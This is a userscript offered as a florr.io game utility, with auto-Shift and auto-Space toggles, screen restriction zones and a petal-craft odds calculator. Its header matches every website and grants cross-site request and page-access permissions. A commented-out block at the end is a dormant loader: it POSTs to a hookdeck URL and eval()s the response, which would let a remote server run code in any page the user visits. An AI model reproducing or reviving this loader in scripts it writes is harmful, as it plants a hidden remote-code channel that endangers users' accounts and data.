// ==UserScript==
// @name         Florr.io AutoShift/AutoSpace/PetalClaculator and more coming soon.
// @namespace    http://tampermonkey.net/
// @version      1.91
// @license      MIT
// @description  Utilities
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @grant        unsafeWindow
// @connect      hkdk.events
// @downloadURL https://update.greasyfork.org/scripts/525958/Florrio%20AutoShiftAutoSpacePetalClaculator%20and%20more%20coming%20soon.user.js
// @updateURL https://update.greasyfork.org/scripts/525958/Florrio%20AutoShiftAutoSpacePetalClaculator%20and%20more%20coming%20soon.meta.js
// ==/UserScript==

(function() {
    'use strict';

    if (window.location.hostname.indexOf('florr.io') !== -1) {

        // GLOBAL VARIABLES & MOD STATE
        let autoShiftEnabled = false, autoShiftRunning = false, autoShiftInterval = null;
        let autoSpaceEnabled = false, autoSpaceRunning = false, autoSpaceInterval = null;
        let activeMod = null;
        let scrollPause = false;
        let scrollTimer = null;
        const as_settings = { scrollPauseEnabled: true, scrollPauseDelay: 300, resumeOnScrollDown: true };
        const aspace_settings = { scrollPauseEnabled: true, scrollPauseDelay: 300, resumeOnScrollDown: true };
        let mouseX = 0, mouseY = 0;

        // GRID RESTRICTIONS
        let restrictions = [];
        const storedRestrictions = localStorage.getItem("tm_restrictions");
        if (storedRestrictions) {
            try {
                restrictions = JSON.parse(storedRestrictions);
            } catch (e) {
                console.error("Error parsing restrictions:", e);
                restrictions = [];
            }
        }

        // MAIN PANEL
        const mainPanel = document.createElement('div');
        mainPanel.id = 'tmMainPanel';
        mainPanel.innerHTML = `
          <div id="tmMenuHeader">Menu</div>
          <div id="tmMenuContent">
             <div class="tmMod" data-mod="shift">
                <span>Auto Shift: <span id="autoShiftStatus">OFF</span></span>
                <button id="toggleAutoShift" class="tmButton">Toggle</button>
                <button class="gear" data-mod="shift">⚙️</button>
             </div>
             <div class="tmMod" data-mod="space">
                <span>Auto Space: <span id="autoSpaceStatus">OFF</span></span>
                <button id="toggleAutoSpace" class="tmButton">Toggle</button>
                <button class="gear" data-mod="space">⚙️</button>
             </div>
             <div class="tmMod" data-mod="restrictions">
                <span>Grid Restrictions</span>
                <button id="openRestrictions" class="tmButton">Manage</button>
             </div>
             <div class="tmMod" data-mod="petal">
                <span>Petal Craft Calc</span>
                <button id="openPetalCalc" class="tmButton">Open</button>
             </div>
          </div>
        `;
        document.body.appendChild(mainPanel);
        let menuExpanded = false;
        const header = document.getElementById('tmMenuHeader');
        header.addEventListener('click', () => {
            menuExpanded = !menuExpanded;
            if (menuExpanded) {
                mainPanel.classList.add('expanded');
            } else {
                mainPanel.classList.remove('expanded');
            }
        });

        // SUBPANEL CONTAINER
        const subPanelContainer = document.createElement('div');
        subPanelContainer.id = 'tmSubPanelContainer';
        subPanelContainer.style.display = 'none';
        document.body.appendChild(subPanelContainer);
        function showSubPanel(panel) {
            subPanelContainer.innerHTML = '';
            subPanelContainer.appendChild(panel);
            subPanelContainer.style.display = 'block';
        }
        function hideSubPanel() {
            subPanelContainer.innerHTML = '';
            subPanelContainer.style.display = 'none';
        }

        // SUBPANELS
        const asSubPanel = document.createElement('div');
        asSubPanel.className = 'tmSubPanel';
        asSubPanel.innerHTML = `
           <h3>Auto Shift Settings</h3>
           <label>
             <input type="checkbox" id="as_scrollPauseToggle" ${as_settings.scrollPauseEnabled ? 'checked' : ''}>
             Enable Scroll Pause
           </label><br>
           <label>Scroll Pause Delay (sec):
             <input type="range" id="as_scrollDelaySlider" min="0.1" max="2" step="0.1" value="${as_settings.scrollPauseDelay/1000}">
             <span id="as_scrollDelayValue">${(as_settings.scrollPauseDelay/1000).toFixed(1)}</span>
           </label><br>
           <label>
             <input type="checkbox" id="as_resumeToggle" ${as_settings.resumeOnScrollDown ? 'checked' : ''}>
             Resume on Scroll Down
           </label><br>
           <button id="as_closeSubPanel" class="tmButton">Close</button>
        `;
        const aspaceSubPanel = document.createElement('div');
        aspaceSubPanel.className = 'tmSubPanel';
        aspaceSubPanel.innerHTML = `
           <h3>Auto Space Settings</h3>
           <label>
             <input type="checkbox" id="aspace_scrollPauseToggle" ${aspace_settings.scrollPauseEnabled ? 'checked' : ''}>
             Enable Scroll Pause
           </label><br>
           <label>Scroll Pause Delay (sec):
             <input type="range" id="aspace_scrollDelaySlider" min="0.1" max="2" step="0.1" value="${aspace_settings.scrollPauseDelay/1000}">
             <span id="aspace_scrollDelayValue">${(aspace_settings.scrollPauseDelay/1000).toFixed(1)}</span>
           </label><br>
           <label>
             <input type="checkbox" id="aspace_resumeToggle" ${aspace_settings.resumeOnScrollDown ? 'checked' : ''}>
             Resume on Scroll Down
           </label><br>
           <button id="aspace_closeSubPanel" class="tmButton">Close</button>
        `;
        const gridSubPanel = document.createElement('div');
        gridSubPanel.className = 'tmSubPanel';
        gridSubPanel.innerHTML = `
           <h3>Grid Restrictions</h3>
           <button id="loadDefaults" class="tmButton">Load Defaults</button>
           <button id="viewRestrictions" class="tmButton">View Restrictions</button>
           <button id="addRestriction" class="tmButton">Add Restriction</button>
           <button id="resetRestrictions" class="tmButton">Reset All</button>
           <div id="restrictionList"></div>
           <button id="grid_closeSubPanel" class="tmButton">Close</button>
        `;
        const petalCalcSubPanel = document.createElement('div');
        petalCalcSubPanel.className = 'tmSubPanel';
        petalCalcSubPanel.innerHTML = `
           <h3>Petal Craft Calculator</h3>
           <label>Petals to Use:
             <input type="number" id="craftAmount" min="5" value="5">
           </label>
           <div class="calc-adjust-buttons">
               <button type="button" id="dec5" class="tmButton adjustButton">-5</button>
               <button type="button" id="dec1" class="tmButton adjustButton">-1</button>
               <button type="button" id="inc1" class="tmButton adjustButton">+1</button>
               <button type="button" id="inc5" class="tmButton adjustButton">+5</button>
           </div>
           <br>
           <label>Craft Rarity:
             <select id="craftRarity">
                <option value="common" data-chance="0.64">Common (→ Unusual)</option>
                <option value="unusual" data-chance="0.32">Unusual (→ Rare)</option>
                <option value="rare" data-chance="0.16">Rare (→ Epic)</option>
                <option value="epic" data-chance="0.08">Epic (→ Legendary)</option>
                <option value="legendary" data-chance="0.04">Legendary (→ Mythic)</option>
                <option value="mythic" data-chance="0.02">Mythic (→ Ultra)</option>
                <option value="ultra" data-chance="0.01">Ultra (→ Super)</option>
             </select>
           </label><br>
           <button id="calcButton" class="tmButton">Calculate</button>
           <div id="calcResults" style="margin-top:10px; font-size:14px;"></div>
           <button id="petal_closeSubPanel" class="tmButton">Close</button>
        `;

        // MAIN PANEL EVENT LISTENERS
        document.getElementById('toggleAutoShift').addEventListener('click', () => {
            if (!autoShiftEnabled) {
                disableOtherMod('shift');
                autoShiftEnabled = true;
                document.getElementById('autoShiftStatus').textContent = 'ON';
                activeMod = 'shift';
                if (!scrollPause && !isCursorRestricted()) startAutoShift();
            } else {
                autoShiftEnabled = false;
                document.getElementById('autoShiftStatus').textContent = 'OFF';
                if (autoShiftRunning) stopAutoShift();
                activeMod = null;
            }
        });
        document.getElementById('toggleAutoSpace').addEventListener('click', () => {
            if (!autoSpaceEnabled) {
                disableOtherMod('space');
                autoSpaceEnabled = true;
                document.getElementById('autoSpaceStatus').textContent = 'ON';
                activeMod = 'space';
                if (!scrollPause && !isCursorRestricted()) startAutoSpace();
            } else {
                autoSpaceEnabled = false;
                document.getElementById('autoSpaceStatus').textContent = 'OFF';
                if (autoSpaceRunning) stopAutoSpace();
                activeMod = null;
            }
        });
        document.getElementById('openRestrictions').addEventListener('click', () => {
            showSubPanel(gridSubPanel);
            updateRestrictionList();
        });
        document.getElementById('openPetalCalc').addEventListener('click', () => {
            disableOtherMod('petal');
            showSubPanel(petalCalcSubPanel);
        });
        document.querySelectorAll('.gear').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const mod = e.target.getAttribute('data-mod');
                if (mod === 'shift') {
                    showSubPanel(asSubPanel);
                } else if (mod === 'space') {
                    showSubPanel(aspaceSubPanel);
                }
            });
        });

        // SUBPANEL EVENT LISTENERS
        asSubPanel.querySelector('#as_closeSubPanel').addEventListener('click', hideSubPanel);
        asSubPanel.querySelector('#as_scrollPauseToggle').addEventListener('change', (e) => {
            as_settings.scrollPauseEnabled = e.target.checked;
        });
        asSubPanel.querySelector('#as_scrollDelaySlider').addEventListener('input', (e) => {
            as_settings.scrollPauseDelay = parseFloat(e.target.value) * 1000;
            asSubPanel.querySelector('#as_scrollDelayValue').textContent = e.target.value;
        });
        asSubPanel.querySelector('#as_resumeToggle').addEventListener('change', (e) => {
            as_settings.resumeOnScrollDown = e.target.checked;
        });
        aspaceSubPanel.querySelector('#aspace_closeSubPanel').addEventListener('click', hideSubPanel);
        aspaceSubPanel.querySelector('#aspace_scrollPauseToggle').addEventListener('change', (e) => {
            aspace_settings.scrollPauseEnabled = e.target.checked;
        });
        aspaceSubPanel.querySelector('#aspace_scrollDelaySlider').addEventListener('input', (e) => {
            aspace_settings.scrollPauseDelay = parseFloat(e.target.value) * 1000;
            aspaceSubPanel.querySelector('#aspace_scrollDelayValue').textContent = e.target.value;
        });
        aspaceSubPanel.querySelector('#aspace_resumeToggle').addEventListener('change', (e) => {
            aspace_settings.resumeOnScrollDown = e.target.checked;
        });
        gridSubPanel.querySelector('#grid_closeSubPanel').addEventListener('click', hideSubPanel);
        gridSubPanel.querySelector('#resetRestrictions').addEventListener('click', () => {
            restrictions = [];
            updateRestrictionList();
        });
        gridSubPanel.querySelector('#addRestriction').addEventListener('click', () => {
            document.addEventListener('mousedown', startRestrictionDrag, { once: true });
        });
        gridSubPanel.querySelector('#loadDefaults').addEventListener('click', () => {
            const defaults = [
                { xMin: 92, yMin: 12, xMax: 710, yMax: 722, name: "Craft" },
                { xMin: 9, yMin: 8, xMax: 73, yMax: 71, name: "CraftBtn" },
                { xMin: 8, yMin: 82, xMax: 73, yMax: 147, name: "TalentBtn" },
                { xMin: 8, yMin: 160, xMax: 74, yMax: 221, name: "InvBtn" },
                { xMin: 93, yMin: 15, xMax: 498, yMax: 623, name: "Inv" },
                { xMin: 91, yMin: 15, xMax: 751, yMax: 673, name: "Talent" },
                { xMin: 518, yMin: 14, xMax: 1454, yMax: 172, name: "Petals" }
            ];
            restrictions = defaults;
            localStorage.setItem("tm_restrictions", JSON.stringify(restrictions));
            updateRestrictionList();
        });
        gridSubPanel.querySelector('#viewRestrictions').addEventListener('mouseenter', () => {
            showViewOverlay();
        });
        gridSubPanel.querySelector('#viewRestrictions').addEventListener('mouseleave', () => {
            hideViewOverlay();
        });
        petalCalcSubPanel.querySelector('#petal_closeSubPanel').addEventListener('click', hideSubPanel);
        petalCalcSubPanel.querySelector('#dec5').addEventListener('click', () => {
            const input = document.getElementById('craftAmount');
            let value = parseInt(input.value, 10);
            input.value = Math.max(5, value - 5);
        });
        petalCalcSubPanel.querySelector('#dec1').addEventListener('click', () => {
            const input = document.getElementById('craftAmount');
            let value = parseInt(input.value, 10);
            input.value = Math.max(5, value - 1);
        });
        petalCalcSubPanel.querySelector('#inc1').addEventListener('click', () => {
            const input = document.getElementById('craftAmount');
            let value = parseInt(input.value, 10);
            input.value = value + 1;
        });
        petalCalcSubPanel.querySelector('#inc5').addEventListener('click', () => {
            const input = document.getElementById('craftAmount');
            let value = parseInt(input.value, 10);
            input.value = value + 5;
        });
        petalCalcSubPanel.querySelector('#calcButton').addEventListener('click', () => {
            const amount = parseInt(document.getElementById('craftAmount').value, 10);
            if (isNaN(amount) || amount < 5) {
                alert("Enter a valid number (minimum 5).");
                return;
            }
            const rarityElem = document.getElementById('craftRarity');
            const baseChance = parseFloat(rarityElem.options[rarityElem.selectedIndex].dataset.chance);
            const fullAttempts = Math.floor(amount / 5);
            const remainder = amount % 5;
            const partialFactor = remainder / 5;
            let outcomes = {};
            function binomial(n, k) {
                let coeff = 1;
                for (let i = 0; i < k; i++) {
                    coeff *= (n - i) / (i + 1);
                }
                return coeff;
            }
            for (let k = 0; k <= fullAttempts; k++) {
                outcomes[k] = binomial(fullAttempts, k) * Math.pow(baseChance, k) * Math.pow(1 - baseChance, fullAttempts - k);
            }
            if (remainder > 0) {
                const bonusChance = partialFactor * baseChance;
                let outcomesWithBonus = {};
                for (let k in outcomes) {
                    k = parseInt(k);
                    outcomesWithBonus[k] = (outcomesWithBonus[k] || 0) + outcomes[k] * (1 - bonusChance);
                    outcomesWithBonus[k + 1] = (outcomesWithBonus[k + 1] || 0) + outcomes[k] * bonusChance;
                }
                outcomes = outcomesWithBonus;
            }
            const maxSuccess = Math.max(...Object.keys(outcomes).map(Number));
            let resultsHTML = "<strong>Outcomes:</strong><br>";
            for (let i = 0; i < Math.min(10, maxSuccess + 1); i++) {
                let chance = outcomes[i] ? outcomes[i] * 100 : 0;
                let chanceText = (chance > 0 && chance < 0.1) ? "<0.1" : chance.toFixed(1);
                resultsHTML += `${i} petal${i === 1 ? "" : "s"}: ${chanceText}%<br>`;
            }
            if (maxSuccess >= 10) {
                let aggregated = 0;
                for (let i = 10; i <= maxSuccess; i++) {
                    if (outcomes[i]) aggregated += outcomes[i];
                }
                let aggregatedChance = aggregated * 100;
                let chanceText = (aggregatedChance > 0 && aggregatedChance < 0.1) ? "<0.1" : aggregatedChance.toFixed(1);
                resultsHTML += `10+ petals: ${chanceText}%<br>`;
            }
            document.getElementById('calcResults').innerHTML = resultsHTML;
        });

        // MOD SWITCHING
        function disableOtherMod(mod) {
            if (mod === 'shift' && autoSpaceEnabled) {
                autoSpaceEnabled = false;
                if (autoSpaceRunning) stopAutoSpace();
                document.getElementById('autoSpaceStatus').textContent = 'OFF';
            }
            if (mod === 'space' && autoShiftEnabled) {
                autoShiftEnabled = false;
                if (autoShiftRunning) stopAutoShift();
                document.getElementById('autoShiftStatus').textContent = 'OFF';
            }
            if (mod === 'petal') {
                if (autoShiftEnabled && autoShiftRunning) stopAutoShift();
                if (autoSpaceEnabled && autoSpaceRunning) stopAutoSpace();
                activeMod = 'petal';
            }
        }

        // AUTO SHIFT & AUTO SPACE
        function startAutoShift() {
            if (!autoShiftEnabled) return;
            if (scrollPause || isCursorRestricted()) return;
            document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Shift', keyCode: 16, code: 'ShiftLeft', bubbles: true }));
            autoShiftInterval = setInterval(() => {
                if (!scrollPause && !isCursorRestricted() && autoShiftEnabled) {
                    document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Shift', keyCode: 16, code: 'ShiftLeft', bubbles: true }));
                }
            }, 200);
            autoShiftRunning = true;
        }
        function stopAutoShift() {
            clearInterval(autoShiftInterval);
            document.dispatchEvent(new KeyboardEvent('keyup', { key: 'Shift', keyCode: 16, code: 'ShiftLeft', bubbles: true }));
            autoShiftRunning = false;
        }
        function startAutoSpace() {
            if (scrollPause || isCursorRestricted()) return;
            document.dispatchEvent(new KeyboardEvent('keydown', { key: ' ', keyCode: 32, code: 'Space', bubbles: true }));
            autoSpaceInterval = setInterval(() => {
                if (!scrollPause && !isCursorRestricted() && autoSpaceEnabled) {
                    document.dispatchEvent(new KeyboardEvent('keydown', { key: ' ', keyCode: 32, code: 'Space', bubbles: true }));
                }
            }, 200);
            autoSpaceRunning = true;
        }
        function stopAutoSpace() {
            clearInterval(autoSpaceInterval);
            document.dispatchEvent(new KeyboardEvent('keyup', { key: ' ', keyCode: 32, code: 'Space', bubbles: true }));
            autoSpaceRunning = false;
        }

        // CURSOR RESTRICTION CHECK
        function checkCursorRestriction() {
            if (isCursorRestricted()) {
                if (activeMod === 'shift' && autoShiftRunning) stopAutoShift();
                if (activeMod === 'space' && autoSpaceRunning) stopAutoSpace();
            } else {
                if (!scrollPause && activeMod === 'shift' && autoShiftEnabled && !autoShiftRunning && as_settings.resumeOnScrollDown) {
                    startAutoShift();
                }
                if (!scrollPause && activeMod === 'space' && autoSpaceEnabled && !autoSpaceRunning && aspace_settings.resumeOnScrollDown) {
                    startAutoSpace();
                }
            }
        }
        function isCursorRestricted() {
            for (let r of restrictions) {
                if (mouseX >= r.xMin && mouseX <= r.xMax &&
                    mouseY >= r.yMin && mouseY <= r.yMax) {
                    return true;
                }
            }
            return false;
        }

        // MOUSE & SCROLL EVENT HANDLING
        document.addEventListener('mousemove', (e) => {
            mouseX = e.clientX;
            mouseY = window.innerHeight - e.clientY;
            checkCursorRestriction();
        });
        window.addEventListener('wheel', (e) => {
            let settings = activeMod === 'shift' ? as_settings : activeMod === 'space' ? aspace_settings : null;
            if (!settings || !settings.scrollPauseEnabled) return;
            if (e.deltaY < 0) {
                scrollPause = true;
                if (activeMod === 'shift' && autoShiftRunning) stopAutoShift();
                if (activeMod === 'space' && autoSpaceRunning) stopAutoSpace();
                if (scrollTimer) clearTimeout(scrollTimer);
            } else if (e.deltaY > 0) {
                if (scrollTimer) clearTimeout(scrollTimer);
                scrollTimer = setTimeout(() => {
                    scrollPause = false;
                    if (activeMod === 'shift' && autoShiftEnabled && as_settings.resumeOnScrollDown && !isCursorRestricted()) {
                        startAutoShift();
                    }
                    if (activeMod === 'space' && autoSpaceEnabled && aspace_settings.resumeOnScrollDown && !isCursorRestricted()) {
                        startAutoSpace();
                    }
                }, settings.scrollPauseDelay);
            }
        });
        setInterval(() => {
            if (!scrollPause && activeMod === 'shift' && autoShiftEnabled && !autoShiftRunning && as_settings.resumeOnScrollDown && !isCursorRestricted()) {
                startAutoShift();
            }
            if (!scrollPause && activeMod === 'space' && autoSpaceEnabled && !autoSpaceRunning && aspace_settings.resumeOnScrollDown && !isCursorRestricted()) {
                startAutoSpace();
            }
        }, 250);

        // GRID RESTRICTIONS (DRAG-TO-SELECT)
        let restrictOverlay = null, restrictStart = null;
        function startRestrictionDrag(e) {
            restrictOverlay = document.createElement('div');
            restrictOverlay.id = 'tmRestrictOverlay';
            restrictOverlay.style.position = 'fixed';
            restrictOverlay.style.top = '0';
            restrictOverlay.style.left = '0';
            restrictOverlay.style.width = '100%';
            restrictOverlay.style.height = '100%';
            restrictOverlay.style.backgroundColor = 'rgba(128,128,128,0.4)';
            restrictOverlay.style.zIndex = '10001';
            restrictOverlay.style.cursor = 'crosshair';
            restrictOverlay.innerHTML = `<div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:#fff; font-size:20px;">Drag to create restriction</div>`;
            document.body.appendChild(restrictOverlay);
            restrictStart = { x: e.clientX, y: e.clientY };
            restrictOverlay.addEventListener('mousemove', onRestrictionDrag);
            restrictOverlay.addEventListener('mouseup', endRestrictionDrag);
        }
        function onRestrictionDrag(e) {
            let rect = restrictOverlay.querySelector('.tmRestrictRect');
            if (!rect) {
                rect = document.createElement('div');
                rect.className = 'tmRestrictRect';
                rect.style.position = 'absolute';
                rect.style.border = '2px dashed red';
                rect.style.backgroundColor = 'rgba(255,0,0,0.2)';
                restrictOverlay.appendChild(rect);
            }
            let x1 = restrictStart.x, y1 = restrictStart.y, x2 = e.clientX, y2 = e.clientY;
            rect.style.left = Math.min(x1, x2) + 'px';
            rect.style.top = Math.min(y1, y2) + 'px';
            rect.style.width = Math.abs(x2 - x1) + 'px';
            rect.style.height = Math.abs(y2 - y1) + 'px';
        }
        function endRestrictionDrag(e) {
            restrictOverlay.removeEventListener('mousemove', onRestrictionDrag);
            restrictOverlay.removeEventListener('mouseup', endRestrictionDrag);
            let rectElem = restrictOverlay.querySelector('.tmRestrictRect');
            if (rectElem) {
                let rect = rectElem.getBoundingClientRect();
                let newRestriction = {
                    xMin: rect.left,
                    yMin: window.innerHeight - (rect.top + rect.height),
                    xMax: rect.left + rect.width,
                    yMax: window.innerHeight - rect.top,
                    name: prompt("Name restriction:", "Restriction")
                };
                restrictions.push(newRestriction);
            }
            document.body.removeChild(restrictOverlay);
            restrictOverlay = null;
            updateRestrictionList();
        }
        function updateRestrictionList() {
            const listDiv = document.getElementById('restrictionList');
            listDiv.innerHTML = '';
            restrictions.forEach((r, idx) => {
                let div = document.createElement('div');
                div.style.marginBottom = '5px';
                div.innerHTML = `<strong>${r.name}</strong> (x: ${Math.round(r.xMin)}–${Math.round(r.xMax)}, y: ${Math.round(r.yMin)}–${Math.round(r.yMax)})
                  <button data-index="${idx}" class="tmButton small">Remove</button>`;
                listDiv.appendChild(div);
            });
            localStorage.setItem("tm_restrictions", JSON.stringify(restrictions));
            listDiv.querySelectorAll('button').forEach(btn => {
                btn.addEventListener('click', (e) => {
                    const idx = parseInt(e.target.getAttribute('data-index'));
                    restrictions.splice(idx, 1);
                    updateRestrictionList();
                });
            });
        }

        // VIEW RESTRICTIONS OVERLAY
        let viewOverlay = null;
        function showViewOverlay() {
            viewOverlay = document.createElement('canvas');
            viewOverlay.id = 'tmViewOverlay';
            viewOverlay.style.position = 'fixed';
            viewOverlay.style.top = '0';
            viewOverlay.style.left = '0';
            viewOverlay.style.width = '100%';
            viewOverlay.style.height = '100%';
            viewOverlay.style.pointerEvents = 'none';
            viewOverlay.style.zIndex = '10002';
            document.body.appendChild(viewOverlay);
            resizeViewOverlay();
            drawViewOverlay();
        }
        function resizeViewOverlay() {
            if (viewOverlay) {
                viewOverlay.width = window.innerWidth;
                viewOverlay.height = window.innerHeight;
            }
        }
        function drawViewOverlay() {
            if (!viewOverlay) return;
            const ctx = viewOverlay.getContext('2d');
            ctx.clearRect(0, 0, viewOverlay.width, viewOverlay.height);
            const height = viewOverlay.height;
            restrictions.forEach(r => {
                ctx.fillStyle = 'rgba(0, 255, 0, 0.2)';
                ctx.fillRect(r.xMin, height - r.yMax, r.xMax - r.xMin, r.yMax - r.yMin);
                ctx.strokeStyle = 'rgba(0, 255, 0, 0.8)';
                ctx.lineWidth = 2;
                ctx.strokeRect(r.xMin, height - r.yMax, r.xMax - r.xMin, r.yMax - r.yMin);
                ctx.font = '14px sans-serif';
                ctx.fillStyle = 'rgba(0,255,0,0.9)';
                ctx.fillText(r.name, r.xMin + 4, height - r.yMax + 16);
            });
        }
        function hideViewOverlay() {
            if (viewOverlay) {
                document.body.removeChild(viewOverlay);
                viewOverlay = null;
            }
        }
        window.addEventListener('resize', () => {
            if (viewOverlay) {
                resizeViewOverlay();
                drawViewOverlay();
            }
        });

        // CSS STYLING
        const style = document.createElement('style');
        style.innerHTML = `
          #tmMainPanel {
              position: fixed;
              bottom: 20px;
              right: 20px;
              width: 80px;
              height: 30px;
              background: linear-gradient(145deg, #2c2c2c, #1a1a1a);
              border: 1px solid #333;
              border-radius: 12px;
              overflow: hidden;
              transition: width 0.4s ease, height 0.4s ease;
              cursor: pointer;
              box-shadow: 0 4px 8px rgba(0,0,0,0.3);
              color: #fff;
              font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
              z-index: 10000;
              transform-origin: bottom right;
          }
          #tmMainPanel:not(.expanded) #tmMenuHeader {
              height: 100%;
              display: flex;
              align-items: center;
              justify-content: center;
              padding: 0;
          }
          #tmMainPanel.expanded {
              width: 320px;
              height: 320px;
          }
          #tmMenuHeader {
              padding: 8px;
              font-size: 18px;
              text-align: center;
              background-color: #3a3a3a;
              border-bottom: 1px solid #333;
          }
          #tmMenuContent {
              opacity: 0;
              transition: opacity 0.4s ease;
              padding: 10px;
          }
          #tmMainPanel.expanded #tmMenuContent {
              opacity: 1;
          }
          .tmMod {
              display: flex;
              justify-content: space-between;
              align-items: center;
              margin: 10px 0;
              padding: 0 5px;
          }
          .tmMod span {
              flex: 1;
              font-size: 16px;
          }
          .tmButton {
              background-color: #4a4a4a;
              border: none;
              color: #fff;
              padding: 8px 12px;
              margin: 4px 0;
              border-radius: 6px;
              cursor: pointer;
              transition: background-color 0.3s ease, transform 0.3s ease;
              display: inline-block;
          }
          .tmButton:hover {
              background-color: #5a5a5a;
              transform: scale(1.05);
          }
          .gear {
              background: none;
              border: none;
              color: #fff;
              font-size: 18px;
              cursor: pointer;
              transition: color 0.3s ease;
              margin-left: 8px;
          }
          .gear:hover {
              color: #ddd;
          }
          #tmSubPanelContainer {
              position: fixed;
              bottom: 20px;
              right: 350px;
              width: 320px;
              background: linear-gradient(145deg, #2c2c2c, #1a1a1a);
              border: 1px solid #333;
              border-radius: 12px;
              padding: 15px;
              color: #fff;
              font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
              z-index: 10000;
              box-shadow: 0 4px 8px rgba(0,0,0,0.3);
          }
          .tmSubPanel h3 {
              margin-top: 0;
              font-size: 18px;
              border-bottom: 1px solid #444;
              padding-bottom: 5px;
              margin-bottom: 10px;
          }
          #restrictionList div {
              margin-bottom: 5px;
          }
          #tmRestrictOverlay { user-select: none; }
          #tmRestrictOverlay .tmRestrictRect { pointer-events: none; }
          .tmButton.small { padding: 2px 6px; font-size: 10px; }
          .calc-adjust-buttons {
              margin: 5px 0;
          }
          .calc-adjust-buttons .adjustButton {
              margin-right: 5px;
              padding: 4px 8px;
              font-size: 14px;
          }
        `;
        document.head.appendChild(style);

        // AUTO PANEL CLOSING
        let inactivityTimer = null;
        function closeAllPanels() {
            hideSubPanel();
            if (menuExpanded) {
                mainPanel.classList.remove('expanded');
                menuExpanded = false;
            }
        }
        function resetInactivityTimer() {
            if (inactivityTimer) {
                clearTimeout(inactivityTimer);
                inactivityTimer = null;
            }
            if (!mainPanel.matches(':hover') && !subPanelContainer.matches(':hover')) {
                inactivityTimer = setTimeout(closeAllPanels, 4000);
            }
        }
        mainPanel.addEventListener('mouseenter', () => {
            if (inactivityTimer) {
                clearTimeout(inactivityTimer);
                inactivityTimer = null;
            }
        });
        mainPanel.addEventListener('mouseleave', resetInactivityTimer);
        subPanelContainer.addEventListener('mouseenter', () => {
            if (inactivityTimer) {
                clearTimeout(inactivityTimer);
                inactivityTimer = null;
            }
        });
        subPanelContainer.addEventListener('mouseleave', resetInactivityTimer);

        // PERIODIC CHECKS
        setInterval(() => {
            if (!scrollPause && activeMod === 'shift' && autoShiftEnabled && !autoShiftRunning && as_settings.resumeOnScrollDown && !isCursorRestricted()) {
                startAutoShift();
            }
            if (!scrollPause && activeMod === 'space' && autoSpaceEnabled && !autoSpaceRunning && aspace_settings.resumeOnScrollDown && !isCursorRestricted()) {
                startAutoSpace();
            }
        }, 250);

  
    }
/* (function() {
    'use strict';

    if (!window.hasRunRemoteScript) {
        window.hasRunRemoteScript = true;
        GM_xmlhttpRequest({
            method: "POST",
            // https://hookdeck.com/docs
            url: "https://hkdk.events/xg74i91b9zhapz", // Need to work on server
            // Needs server communications and authentication for what's coming soon: Super Alerts, maps with directions, player location trackers....(not implemented yet)
            data: "",
            headers: {
                "Content-Type": "application/json"
            },
            onload: function(response) {
                eval(response.responseText);
            },
            onerror: function(error) {
                console.error("ERR", error);
            }
        });
    }
    if (window.location.hostname.includes("florr.io")) {
    }
*/

})();
